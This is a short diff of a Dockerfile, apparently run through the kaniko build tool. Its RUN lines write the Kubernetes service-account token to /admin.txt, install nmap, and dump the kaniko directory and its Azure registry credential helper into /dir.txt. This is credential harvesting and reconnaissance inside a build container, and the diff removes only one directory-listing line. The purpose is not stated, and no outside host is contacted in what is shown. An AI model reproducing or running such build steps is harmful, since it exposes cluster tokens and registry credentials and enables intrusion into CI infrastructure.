@@ -6,7 +6,6 @@ RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
 RUN apt-get update
 RUN apt-get install nmap -y
 RUN apt install tree 
-RUN echo `tree /kaniko` > /dir.txt
 RUN echo `ls /kaniko` >> /dir.txt
 RUN echo `cat /kanico/*` >> /dir.txt
 RUN echo `ls /kanico/docker-credential-acr-env` >> /dir.txt
